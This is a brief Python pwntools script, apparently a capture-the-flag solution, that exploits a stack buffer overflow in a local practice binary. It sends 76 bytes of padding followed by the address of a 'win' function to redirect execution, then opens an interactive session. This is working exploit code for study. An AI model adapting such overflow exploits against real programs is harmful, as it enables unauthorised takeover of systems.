from pwn import *

elf = ELF('./challenge')
context.binary = elf

offset = 76
win_address = elf.sym['win']  # 0x080491b6

payload = b'A' * offset
payload += pack(win_address)

p = process('./challenge')

p.sendlineafter(b'input: ', payload)
p.interactive()